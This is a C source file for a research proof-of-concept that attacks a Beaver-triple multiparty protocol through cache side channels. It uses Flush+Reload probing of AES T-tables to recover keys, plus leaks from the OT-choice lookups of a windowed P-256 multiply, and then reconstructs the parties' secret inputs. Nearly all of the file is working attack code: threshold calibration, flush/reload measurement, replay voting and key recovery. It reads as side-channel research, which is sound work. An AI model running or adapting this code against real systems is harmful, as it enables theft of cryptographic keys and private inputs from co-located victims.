// Combined attacker P1: one beaver run, both masks recovered, inputs reconstructed.
//   b_i: Black Swans on the AES-PRG (leak Te -> key -> PRG byte -> b_i = M1_i ^ PRG)
//   a_i: P-256 OT-choice window leak (two nibbles)
//   then x,y via the protocol openings.
//
//   gcc -O2 -march=native beaver_attacker.c -o beaver_attacker -lrt
//   beaver_attacker <trials> <votes>          (BEAVER_ORACLE=1 -> exact-leak check, no timing)
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include "beaver_common.h"
#include "aes_leak.h"
#include "blackswans.h"

#ifndef NTRACES
#define NTRACES 5          // AES/Black-Swans traces (consecutive counters); override with -DNTRACES=N
#endif
static int ORACLE = 0;

static int cmp_u64(const void*a,const void*b){uint64_t x=*(const uint64_t*)a,y=*(const uint64_t*)b;return (x>y)-(x<y);}
// Hit/miss cutoff, biased toward the hit side so prefetched (but not victim-accessed)
// lines don't read as hits. BEAVER_THRESHOLD pins an exact value; BEAVER_THRFRAC sets
// the fraction between hit and miss medians (default 0.25). Prints the medians.
static uint64_t calibrate(BeaverShared* s){
    const char* te=getenv("BEAVER_THRESHOLD");
    if(te && *te){ uint64_t t=strtoull(te,0,10); fprintf(stderr,"calib: pinned BEAVER_THRESHOLD=%llu\n",(unsigned long long)t); return t; }
    const char* fe=getenv("BEAVER_THRFRAC"); double frac=(fe&&*fe)?atof(fe):0.25;
    const int IT=2000; uint64_t *h=malloc(8*IT),*m=malloc(8*IT);
    volatile uint8_t* probe=(volatile uint8_t*)&s->Te[0][0];
    volatile uint8_t* evict=malloc(8*1024*1024);
    for(int i=0;i<IT;i++){volatile uint8_t v=*probe;(void)v;_mm_mfence();h[i]=beaver_measure(probe);}
    for(int i=0;i<IT;i++){_mm_clflush((const void*)probe);
        for(size_t j=0;j<8*1024*1024;j+=64){volatile uint8_t v=evict[j];(void)v;}
        _mm_mfence();m[i]=beaver_measure(probe);}
    qsort(h,IT,8,cmp_u64);qsort(m,IT,8,cmp_u64);
    uint64_t hm=h[IT/2],mm=m[IT/2],t=(mm>hm)?(uint64_t)(hm+(mm-hm)*frac):hm+40;
    fprintf(stderr,"calib: hit_med=%llu miss_med=%llu frac=%.2f -> thr=%llu\n",
            (unsigned long long)hm,(unsigned long long)mm,frac,(unsigned long long)t);
    free(h);free(m);free((void*)evict);return t;
}
static void wait_done(BeaverShared* s){ while(!s->done_ack && !s->exit_flag) _mm_pause(); s->done_ack=0; }

// Recover the current party's AES key, then Black Swans.
// MODEL: this AES vector assumes the CONTROLLED-CHANNEL (malicious-OS / SGX) attacker.
// That model provides two capabilities, both used here:
//   (1) per-access single-step isolation  -> the victim exposes ONE Te access per
//       trigger (round j, byte p), so each access is cleanly attributable;
//   (2) replay: the OS re-invokes the victim on the SAME input on demand -> we read
//       the same nibble `votes` times and take the majority ("votes"), which averages
//       Flush+Reload measurement noise. Replay is free in this model (same OS control
//       that enables single-stepping), so votes add no power beyond it.
// This is STRICTLY STRONGER than the EC side (single-shot, passive co-resident) and
// than the paper's model; real AES is not attackable without it (160 accesses/16 lines
// can't be separated by a passive union, and the ciphertext is masked).
static int recover_key(BeaverShared* s, uint64_t thr, int votes, const uint8_t true_key[16],
                       const uint8_t base_ctr[16], uint8_t key_out[16]) {
    static uint8_t leaks[NTRACES][5][16];
    uint8_t trk[11][16]; if (ORACLE) aes128_key_expansion(true_key,trk);
    for (int t=0;t<NTRACES;t++){
        uint8_t ctr[16]; memcpy(ctr,base_ctr,16); ctr[15]=(uint8_t)(base_ctr[15]+t);
        if (ORACLE){
            uint8_t st[11][16],ct[16]; aes128_encrypt_trace(ctr,trk,st,ct);
            for(int j=0;j<5;j++)for(int p=0;p<16;p++) leaks[t][j][p]=st[j][p]&0xF0;
            continue;
        }
        memcpy((void*)s->aes_ctr,ctr,16); s->aes_load=1; while(s->aes_load&&!s->exit_flag)_mm_pause();
        for(int j=0;j<5;j++)for(int p=0;p<16;p++){
            int score[16]={0};
            for(int v=0;v<votes;v++){                            // replay: re-invoke same op
                int ord[16];for(int d=0;d<16;d++)ord[d]=d;
                for(int d=15;d>0;d--){int r=rand()%(d+1);int tmp=ord[d];ord[d]=ord[r];ord[r]=tmp;}
                for(int l=0;l<16;l++)_mm_clflush((const void*)((uint8_t*)s->Te[p&3]+l*64));
                _mm_mfence();
                s->aes_round=j;s->aes_pos=p;s->trig_aes=1;while(s->trig_aes&&!s->exit_flag)_mm_pause();
                int best=-1;uint64_t bt=UINT64_MAX;
                for(int oi=0;oi<16;oi++){int l=ord[oi];
                    uint64_t tm=beaver_measure((volatile uint8_t*)((uint8_t*)s->Te[p&3]+l*64));
                    if(tm<thr&&tm<bt){bt=tm;best=l;}}
                if(best>=0)score[best]++;
            }
            int bl=0;for(int l=1;l<16;l++)if(score[l]>score[bl])bl=l;
            leaks[t][j][p]=(uint8_t)(bl<<4);
        }
    }
    uint8_t ctr0[16]; (void)ctr0;
    return bs_recover_robust(leaks, NTRACES, (80*NTRACES)/8, key_out, ctr0);
}

// probe one 16-entry table once; return the fastest line < thr, or -1 if none hot.
static int probe_fastest(ECTabEntry* tab, uint64_t thr){
    int ord[16];for(int d=0;d<16;d++)ord[d]=d;
    for(int d=15;d>0;d--){int r=rand()%(d+1);int tmp=ord[d];ord[d]=ord[r];ord[r]=tmp;}
    int best=-1;uint64_t bt=UINT64_MAX;
    for(int oi=0;oi<16;oi++){int d=ord[oi];
        uint64_t tm=beaver_measure((volatile uint8_t*)&tab[d]);
        if(tm<thr&&tm<bt){bt=tm;best=d;}}
    return best;
}

// Recover the whole OT choice byte a from ONE real windowed multiply.
// SINGLE-SHOT (paper's Base-OT model): one flush/trigger/reload round. The victim's
// trigger now runs the real B2 = a*G + k*G; its two a-table lookups (low & high nibble)
// each leave one hot line, which we read back. A cold table -> that nibble is guessed.
static uint8_t recover_ec_byte(BeaverShared* s, uint64_t thr, uint8_t true_a) {
    if (ORACLE) return true_a;
    for(int d=0;d<16;d++){ _mm_clflush((const void*)&s->ec_lo[d]); _mm_clflush((const void*)&s->ec_hi[d]); }
    _mm_mfence();
    s->trig_ec=1; while(s->trig_ec&&!s->exit_flag)_mm_pause();
    int lo = probe_fastest(s->ec_lo, thr);
    int hi = probe_fastest(s->ec_hi, thr);
    if(lo<0) lo = rand()&0xF;
    if(hi<0) hi = rand()&0xF;
    return (uint8_t)((hi<<4)|lo);
}

int main(int argc,char**argv){
    if(argc<3){fprintf(stderr,"usage: %s <trials> <votes>   (traces = NTRACES, compile-time)\n",argv[0]);return 1;}
    int trials=atoi(argv[1]); int votes=atoi(argv[2]); if(votes<1)votes=1;
    ORACLE = getenv("BEAVER_ORACLE") ? atoi(getenv("BEAVER_ORACLE")) : 0;

    int fd=-1; for(int r=0;r<2000;r++){fd=shm_open(SHM_BEAVER_NAME,O_RDWR,0666);if(fd!=-1)break;usleep(1000);}
    if(fd==-1){perror("shm_open");return 2;}
    BeaverShared* s=mmap(NULL,sizeof(BeaverShared),PROT_READ|PROT_WRITE,MAP_SHARED,fd,0);
    if(s==MAP_FAILED){perror("mmap");return 2;}
    while(!s->ready)_mm_pause();
    uint64_t thr = ORACLE ? 0 : calibrate(s);
    srand(time(NULL));
    fprintf(stderr,"Combined beaver run: %d trials, %d traces, %d votes (AES only), mode=%s\n",
            trials,NTRACES,votes,ORACLE?"ORACLE(exact)":"F+R");

    const uint8_t a1=0x11,b1=0x22;
    int eb=0,ex=0,comb=0, k_ok=0, a_ok=0;

    for(int t=0;t<trials;t++){
        uint8_t K2[16],K3[16];
        for(int i=0;i<16;i++){K2[i]=rand()&0xFF;K3[i]=rand()&0xFF;}
        uint8_t a2=rand()&0xFF,a3=rand()&0xFF,b2=rand()&0xFF,b3=rand()&0xFF;
        uint8_t sx=rand()&0xFF,sy=rand()&0xFF;
        uint8_t base[16]; for(int i=0;i<16;i++) base[i]=rand()&0xFF; base[15]=rand()%0xC0;

        memcpy((void*)s->aes_key2,K2,16); memcpy((void*)s->aes_key3,K3,16);
        s->a2=a2;s->a3=a3;s->b2=b2;s->b3=b3; memcpy((void*)s->base_ctr,base,16);

        // publish both observable wires once. In ORACLE mode compute locally
        // (victim-independent, isolates attack logic from VM scheduling races).
        uint8_t M1_2, M1_3;
        if (ORACLE) {
            uint8_t lrk[11][16],st[11][16],ct[16],v[16];
            aes128_key_expansion(K2,lrk); memcpy(v,base,16); aes128_encrypt_trace(v,lrk,st,ct); M1_2=(uint8_t)(b2^ct[0]);
            aes128_key_expansion(K3,lrk); memcpy(v,base,16); aes128_encrypt_trace(v,lrk,st,ct); M1_3=(uint8_t)(b3^ct[0]);
        } else {
            s->want_M1=1; while(s->want_M1&&!s->exit_flag)_mm_pause();
            M1_2=s->M1_2; M1_3=s->M1_3;
        }

        uint8_t recK[16], rb[4]={0}, ra[4]={0};
        (void)0;
        uint8_t recb2=0,recb3=0,reca2=0,reca3=0;
        for(int party=2;party<=3;party++){
            s->cur_party=(uint8_t)party;
            const uint8_t* K = (party==2)?K2:K3;
            uint8_t trueA = (party==2)?a2:a3;
            uint8_t M1 = (party==2)?M1_2:M1_3;
            // --- recover PRG key -> b ---
            memset(recK,0,16);
            int g = recover_key(s, thr, votes, K, base, recK);
            // Always use the RECOVERED key — never the true key — so a failed
            // recovery honestly yields a wrong b (no oracle leakage into scoring).
            uint8_t prg_byte;
            { uint8_t lrk[11][16],st[11][16],ct[16]; aes128_key_expansion(recK,lrk);
              uint8_t v[16];memcpy(v,base,16); aes128_encrypt_trace(v,lrk,st,ct); prg_byte=ct[0]; }
            uint8_t recb = g ? (uint8_t)(M1 ^ prg_byte) : 0xFF;
            int key_correct = g && memcmp(recK,K,16)==0;
            // --- recover OT choice a (single-shot, one real windowed multiply) ---
            uint8_t reca = recover_ec_byte(s, thr, trueA);
            if(party==2){recb2=recb;reca2=reca;} else {recb3=recb;reca3=reca;}
            k_ok += key_correct; a_ok += (reca==trueA);
            (void)rb;(void)ra;
        }

        // --- protocol synthesis (public openings), GF(2^8): shares combine by XOR ---
        uint8_t dx=(uint8_t)(sx ^ a1 ^ a2 ^ a3);
        uint8_t dy=(uint8_t)(sy ^ b1 ^ b2 ^ b3);
        uint8_t rx=(uint8_t)(dx ^ a1 ^ reca2 ^ reca3);
        uint8_t ry=(uint8_t)(dy ^ b1 ^ recb2 ^ recb3);
        int Eb=(recb2==b2)&&(recb3==b3);
        int Ex=(rx==sx);
        eb+=Eb; ex+=Ex; comb += (Eb&&Ex&&(ry==sy));
    }
    s->exit_flag=1; munmap(s,sizeof(BeaverShared)); close(fd);

    // One compact row per run. Print a header when asked (first row of a sweep).
    if (getenv("BEAVER_HEADER")) {
        printf("%-6s %-7s | %-11s | %-11s | %-7s | %-7s | %-12s\n",
               "votes","traces","AES key b","OT choice a","b2,b3","x","FULL (x & y)");
        printf("------------------------------------------------------------------------------\n");
    }
    printf("%-6d %-7d | %3d/%-3d %3.0f%% | %3d/%-3d %3.0f%% | %5.1f%% | %5.1f%% | %6.1f%%  [%s]\n",
           votes, NTRACES,
           k_ok, 2*trials, 100.0*k_ok/(2*trials),
           a_ok, 2*trials, 100.0*a_ok/(2*trials),
           100.0*eb/trials, 100.0*ex/trials, 100.0*comb/trials,
           ORACLE?"oracle":"F+R");
    return 0;
}
